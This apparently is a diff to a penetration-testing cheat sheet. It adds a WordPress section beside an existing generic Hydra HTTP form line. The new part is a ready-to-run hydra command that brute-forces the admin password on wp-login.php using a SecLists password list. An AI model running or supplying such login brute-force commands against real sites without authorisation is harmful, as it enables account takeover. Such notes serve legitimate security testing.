@@ -25,3 +25,10 @@ HTTP post form
 hydra -L <wordlist> -P<password list> <IP> http-post-form "<file path>:username=^USER^&password=^PASS^&Login=Login:<fail message>"
 ```
 
+Wordpress
+```
+hydra -l admin  -P /opt/seclists/Passwords/probable-v2-top1575.txt  TARGET -V http-form-post '/wp/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'
+
+```
+
+
